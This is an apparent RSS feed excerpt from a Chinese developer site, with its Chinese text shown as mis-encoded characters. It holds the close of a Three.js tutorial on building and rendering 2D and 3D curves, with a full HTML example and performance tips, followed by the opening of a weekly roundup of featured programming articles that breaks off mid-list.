  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>)
);
curvePath.<span class="hljs-title function_">add</span>(lineCurve);

<span class="hljs-comment">// å­æ›²çº¿2ï¼šåœ†å¼§ï¼ˆä»(100,0)åˆ°(100,100)ï¼Œ90Â°åœ†å¼§ï¼‰</span>
<span class="hljs-keyword">const</span> arcCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">ArcCurve</span>(
  <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">2</span>, <span class="hljs-literal">true</span>
);
curvePath.<span class="hljs-title function_">add</span>(arcCurve);

<span class="hljs-comment">// 3. é—­åˆæ›²çº¿ï¼ˆå¯é€‰ï¼‰</span>
<span class="hljs-comment">// curvePath.closePath();</span>

<span class="hljs-comment">// 4. ç»Ÿä¸€é‡‡æ ·é¡¶ç‚¹ï¼ˆ100ä¸ªç‚¹ï¼‰</span>
<span class="hljs-keyword">const</span> points = curvePath.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 5. æ¸²æŸ“ç»„åˆæ›²çº¿</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xff6600</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<hr/>
<h3 data-id="heading-49">å››ã€å®Œæ•´å®æˆ˜ç¤ºä¾‹ï¼ˆå¤šæ›²çº¿ç»„åˆï¼‰</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Three.js æ›²çº¿å®Œæ•´ç¤ºä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">overflow</span>: hidden; }</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// åœ°å€ï¼Œå‡çº§ä¸º174ç‰ˆæœ¬</span>
    <span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'https://esm.sh/three@0.174.0'</span>;
    <span class="hljs-keyword">import</span> { <span class="hljs-title class_">OrbitControls</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'https://esm.sh/three@0.174.0/examples/jsm/controls/OrbitControls.js'</span>;
    <span class="hljs-keyword">import</span> { <span class="hljs-title class_">GLTFLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'https://esm.sh/three@0.174.0/examples/jsm/loaders/GLTFLoader.js'</span>;
    <span class="hljs-comment">// 1. åˆ›å»ºä¸‰å¤§æ ¸å¿ƒ</span>
    <span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
    <span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>/<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
    <span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
    renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);
    camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">300</span>); <span class="hljs-comment">// ç›¸æœºåé€€ï¼Œçœ‹æ¸…æ‰€æœ‰æ›²çº¿</span>

    <span class="hljs-comment">// 2. è½¨é“æ§åˆ¶å™¨ï¼ˆ3Dè§†è§’äº¤äº’ï¼‰</span>
    <span class="hljs-keyword">const</span> controls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrbitControls</span>(camera, renderer.<span class="hljs-property">domElement</span>);
    controls.<span class="hljs-property">enableDamping</span> = <span class="hljs-literal">true</span>;
    controls.<span class="hljs-property">dampingFactor</span> = <span class="hljs-number">0.05</span>;

    <span class="hljs-comment">// 3. ç»˜åˆ¶2Dæ¤­åœ†</span>
    <span class="hljs-keyword">const</span> ellipseCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">EllipseCurve</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">80</span>, <span class="hljs-number">40</span>);
    <span class="hljs-keyword">const</span> ellipsePoints = ellipseCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">50</span>);
    <span class="hljs-keyword">const</span> ellipseGeo = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
    ellipseGeo.<span class="hljs-title function_">setFromPoints</span>(ellipsePoints);
    <span class="hljs-keyword">const</span> ellipseMat = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xff0000</span> });
    <span class="hljs-keyword">const</span> ellipseLine = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineLoop</span>(ellipseGeo, ellipseMat);
    scene.<span class="hljs-title function_">add</span>(ellipseLine);

    <span class="hljs-comment">// 4. ç»˜åˆ¶3Dæ ·æ¡æ›²çº¿</span>
    <span class="hljs-keyword">const</span> catmullCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CatmullRomCurve3</span>([
      <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">50</span>, <span class="hljs-number">80</span>, <span class="hljs-number">50</span>),
      <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">50</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">100</span>),
      <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>)
    ]);
    <span class="hljs-keyword">const</span> catmullPoints = catmullCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);
    <span class="hljs-keyword">const</span> catmullGeo = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
    catmullGeo.<span class="hljs-title function_">setFromPoints</span>(catmullPoints);
    <span class="hljs-keyword">const</span> catmullMat = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x0000ff</span> });
    <span class="hljs-keyword">const</span> catmullLine = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(catmullGeo, catmullMat);
    scene.<span class="hljs-title function_">add</span>(catmullLine);

    <span class="hljs-comment">// 5. åŠ¨ç”»å¾ªç¯</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">requestAnimationFrame</span>(animate);
      controls.<span class="hljs-title function_">update</span>();
      renderer.<span class="hljs-title function_">render</span>(scene, camera);
    }
    <span class="hljs-title function_">animate</span>();

    <span class="hljs-comment">// 6. çª—å£é€‚é…</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> {
      camera.<span class="hljs-property">aspect</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;
      camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
      renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-50">ç¤ºä¾‹æ•ˆæœ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f56e2840ed84e8f9c368737bcd4c0dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCg6L2u5a2Q55qE54yq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769669026&amp;x-signature=SxAMEvMpL26gSD6IWyAn0WOxnZ8%3D" alt="c7c96963-4107-4138-a72c-08caaa36d7f3.png" loading="lazy"/></p>
<ol>
<li>åœºæ™¯ä¸­æ˜¾ç¤ºçº¢è‰²2Dæ¤­åœ†ï¼ˆXYå¹³é¢ï¼‰å’Œè“è‰²3Dæ ·æ¡æ›²çº¿ï¼ˆç©ºé—´å¼¯æ›²ï¼‰ï¼›</li>
<li>æ”¯æŒé¼ æ ‡æ—‹è½¬/ç¼©æ”¾è§†è§’ï¼ŒæŸ¥çœ‹3Dæ›²çº¿çš„ç©ºé—´å½¢æ€ï¼›</li>
<li>æ›²çº¿å¹³æ»‘æ— é”¯é½¿ï¼Œè‰²å½©æ— åè‰²ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-51">äº”ã€æ³¨æ„äº‹é¡¹ä¸ä¼˜åŒ–</h3>
<h4 data-id="heading-52">1. å¸¸è§å‘ç‚¹</h4>
<ul>
<li><strong>çº¿å®½é™åˆ¶</strong>ï¼šWebGLæ ‡å‡†ä¸­çº¿å®½ï¼ˆ<code>linewidth</code>ï¼‰ä»…æ”¯æŒ1pxï¼Œéƒ¨åˆ†æµè§ˆå™¨æ”¯æŒ&gt;1ä½†å…¼å®¹æ€§å·®ï¼Œå¦‚éœ€ç²—çº¿æ¡å»ºè®®ç”¨ <code>Mesh</code> æ¨¡æ‹Ÿï¼ˆå¦‚æŒ¤å‹æ›²çº¿æˆé¢ï¼‰ï¼›</li>
<li><strong>3Dæ›²çº¿è§†è§’</strong>ï¼š3Dæ›²çº¿éœ€è°ƒæ•´ç›¸æœºä½ç½®ï¼ˆZè½´åé€€ï¼‰ï¼Œå¦åˆ™å¯èƒ½çœ‹ä¸åˆ°ï¼›</li>
<li><strong>é‡‡æ ·ç‚¹æ•°</strong>ï¼šå¤æ‚æ›²çº¿ï¼ˆå¦‚ä¸‰æ¬¡è´å¡å°”ï¼‰éœ€å¢åŠ é‡‡æ ·ç‚¹æ•°ï¼ˆ100~200ï¼‰ï¼Œå¦åˆ™ä¼šå‡ºç°é”¯é½¿ï¼›</li>
<li><strong>CurvePathé—­åˆ</strong>ï¼š<code>closePath()</code> ä»…å¯¹2Dæ›²çº¿æœ‰æ•ˆï¼Œ3Dæ›²çº¿é—­åˆéœ€æ‰‹åŠ¨è°ƒæ•´æ§åˆ¶ç‚¹ã€‚</li>
</ul>
<h4 data-id="heading-53">2. æ€§èƒ½ä¼˜åŒ–</h4>
<ul>
<li><strong>å¤ç”¨å‡ ä½•ä½“</strong>ï¼šå¤šä¸ªæ›²çº¿å¤ç”¨åŒä¸€ä¸ª <code>BufferGeometry</code>ï¼ˆæ¸…ç©ºé¡¶ç‚¹åé‡æ–°ç»‘å®šï¼‰ï¼›</li>
<li><strong>å‡å°‘é‡‡æ ·ç‚¹æ•°</strong>ï¼šç®€å•æ›²çº¿ï¼ˆç›´çº¿ã€åœ†å¼§ï¼‰é‡‡æ ·ç‚¹æ•°è®¾50å³å¯ï¼Œæ— éœ€è¿‡é«˜ï¼›</li>
<li><strong>æ‰¹é‡æ¸²æŸ“</strong>ï¼šå¤šä¸ªæ›²çº¿åˆå¹¶ä¸ºä¸€ä¸ª <code>Line</code> æ¨¡å‹ï¼Œå‡å°‘æ¸²æŸ“è°ƒç”¨ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-54">æ ¸å¿ƒæ€»ç»“</h3>
<ol>
<li><strong>æ ¸å¿ƒæµç¨‹</strong>ï¼š<code>åˆ›å»ºæ›²çº¿ â†’ getPointsé‡‡æ ·é¡¶ç‚¹ â†’ å‡ ä½•ä½“ç»‘å®šé¡¶ç‚¹ â†’ Line/LineLoopæ¸²æŸ“</code>ï¼›</li>
<li><strong>æ›²çº¿é€‰å‹</strong>ï¼š
<ul>
<li>2Dç®€å•æ›²çº¿ï¼šLineCurve/ArcCurve/EllipseCurveï¼›</li>
<li>2Då¤æ‚æ›²çº¿ï¼šSplineCurve/CubicBezierCurveï¼›</li>
<li>3Dè·¯å¾„ï¼šCatmullRomCurve3ï¼ˆæ¨èï¼‰/CubicBezierCurve3ï¼›</li>
<li>å¤åˆæ›²çº¿ï¼šCurvePathï¼ˆç»„åˆå¤šä¸ªå­æ›²çº¿ï¼‰ï¼›</li>
</ul>
</li>
<li><strong>å…³é”®å‚æ•°</strong>ï¼š
<ul>
<li><code>getPoints(n)</code> ä¸­ <code>n</code> å†³å®šå¹³æ»‘åº¦ï¼Œæ¨è50~100ï¼›</li>
<li>3Dæ›²çº¿éœ€è°ƒæ•´ç›¸æœºZè½´ä½ç½®ï¼Œç¡®ä¿å¯è§ï¼›</li>
<li>è´å¡å°”æ›²çº¿çš„ã€Œæ§åˆ¶ç‚¹ã€æ˜¯å†³å®šæ›²çº¿å½¢çŠ¶çš„æ ¸å¿ƒã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº§å“å‚¬ï¼š 1 å¤©ä¼˜åŒ– Vue å®˜ç½‘ SEOï¼Ÿæˆ‘ç”¨è¿™ä¸ªæ’ä»¶åŠå¤©æå®šï¼ˆä¸é‡æ„ Nuxtï¼‰ | æ˜é‡‘ä¸€å‘¨ 1.22]]></title>    <link>https://juejin.cn/post/7597779410406260770</link>    <guid>https://juejin.cn/post/7597779410406260770</guid>    <pubDate>2026-01-22T06:49:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597779410406260770" data-draft-id="7597776334065057844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº§å“å‚¬ï¼š 1 å¤©ä¼˜åŒ– Vue å®˜ç½‘ SEOï¼Ÿæˆ‘ç”¨è¿™ä¸ªæ’ä»¶åŠå¤©æå®šï¼ˆä¸é‡æ„ Nuxtï¼‰ | æ˜é‡‘ä¸€å‘¨ 1.22"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-22T06:49:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘ä¸€å‘¨"/> <meta itemprop="url" content="https://juejin.cn/user/53218623894222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº§å“å‚¬ï¼š 1 å¤©ä¼˜åŒ– Vue å®˜ç½‘ SEOï¼Ÿæˆ‘ç”¨è¿™ä¸ªæ’ä»¶åŠå¤©æå®šï¼ˆä¸é‡æ„ Nuxtï¼‰ | æ˜é‡‘ä¸€å‘¨ 1.22
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/53218623894222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘ä¸€å‘¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:49:53.000Z" title="Thu Jan 22 2026 06:49:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>æœ¬æ–‡å­—æ•°1800+ ï¼Œé˜…è¯»æ—¶é—´å¤§çº¦éœ€è¦ 4åˆ†é’Ÿã€‚</em></p>
<blockquote>
<p>ã€æ˜é‡‘ä¸€å‘¨ã€‘æœ¬æœŸäº®ç‚¹ï¼š</p>
</blockquote>
<ul>
<li>
<p><a href="https://juejin.cn/post/7593535577046417443" target="_blank" title="https://juejin.cn/post/7593535577046417443">Tailwind å› ä¸º AI çš„è£å‘˜â€œé—¹å‰§â€ç»“æŸï¼Œè€Œ AI å¯¹å¼€æºé¡¹ç›®çš„å½±å“æ‰åˆšåˆšå¼€å§‹</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7594731175405633576" target="_blank" title="https://juejin.cn/post/7594731175405633576">é¸¿è’™åº”ç”¨çš„â€œä»»æ„é—¨â€ï¼šDeep Linking ä¸ App Linking çš„ç›¸çˆ±ç›¸æ€</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7593595780222500870" target="_blank" title="https://juejin.cn/post/7593595780222500870">å‘Šåˆ«æ‰‹å†™ç¤¼ç°¿ï¼ä¸€æ¬¾å¼€æºå…è´¹çš„ç”µå­çº¢ç™½å–œäº‹ç¤¼ç°¿ç³»ç»Ÿï¼</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7594817135128248354" target="_blank" title="https://juejin.cn/post/7594817135128248354">ä¸ºä»€ä¹ˆJavaé‡Œé¢ï¼ŒService å±‚ä¸ç›´æ¥è¿”å› Result å¯¹è±¡ï¼Ÿ</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7594301878828498982" target="_blank" title="https://juejin.cn/post/7594301878828498982">Spring çš„è¥¿è¥¿å¼—æ–¯ä¹‹çŸ³ï¼šç†è§£ BeanFactoryã€FactoryBean ä¸ ObjectFactory</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7594863660280496147" target="_blank" title="https://juejin.cn/post/7594863660280496147">Compose Multiplatform 1.10 Interop views æ–°ç‰¹æ€§ï¼šOverlay å’Œ Autosizing</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7594813727053905954" target="_blank" title="https://juejin.cn/post/7594813727053905954">OpenCode ä¸Šæ‰‹åˆä½“éªŒï¼šä»å®‰è£…åˆ°ä½¿ç”¨</a></p>
</li>
</ul>
<blockquote>
<p><strong>ã€Œä¸Šæ¦œè§„åˆ™ã€</strong>ï¼šæ–‡ç« å‘å¸ƒæ—¶é—´åœ¨æœ¬æœŸã€Œæ˜é‡‘ä¸€å‘¨ã€å‘å¸ƒæ—¶é—´çš„å‰ä¸€å‘¨å†…ï¼›ä¸”ç¬¦åˆå„ä¸ªæ ç›®çš„å†…å®¹å®šä½å’Œè¦æ±‚ã€‚ å¦‚å‘ç°æ–‡ç« æœ‰æŠ„è¢­ã€æ´—ç¨¿ç­‰è¿åç¤¾åŒºè§„åˆ™çš„è¡Œä¸ºï¼Œå°†å–æ¶ˆå½“æœŸåŠåç»­ä¸Šæ¦œèµ„æ ¼ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€å‘¨â€œé‡‘â€é€‰</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d5bf990a124e3a87cffb06443ad9ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5LiA5ZGo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769669393&amp;x-signature=hCgzIcL7Ke82l64WOlty7T7V%2Fu0%3D" alt="æ˜é‡‘ä¸€å‘¨ æ–‡ç« å¤´å›¾ 1303x734.jpg" loading="lazy"/></p>
<p><em>å†…å®¹è¯„å®¡ä»¬ä¼šåœ¨è¿‡å»çš„ä¸€å‘¨å†…å¯¹ç¤¾åŒºæ·±åº¦æŠ€æœ¯å¥½æ–‡è¿›è¡ŒæŒ–æ˜å’Œç­›é€‰ï¼Œä¼˜è´¨çš„æŠ€æœ¯æ–‡ç« æœ‰æœºä¼šå‡ºç°åœ¨ä¸‹æ–¹æ¦œå•ä¸­ï¼Œæ’åä¸åˆ†å…ˆåã€‚</em></p>
<h3 data-id="heading-1">å‰ç«¯</h3>
<p><a href="https://juejin.cn/post/7593535577046417443" target="_blank" title="https://juejin.cn/post/7593535577046417443">Tailwind å› ä¸º AI çš„è£å‘˜â€œé—¹å‰§â€ç»“æŸï¼Œè€Œ AI å¯¹å¼€æºé¡¹ç›®çš„å½±å“æ‰åˆšåˆšå¼€å§‹</a><a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@æ‹çŒ«deå°éƒ­</a></p>
<blockquote>
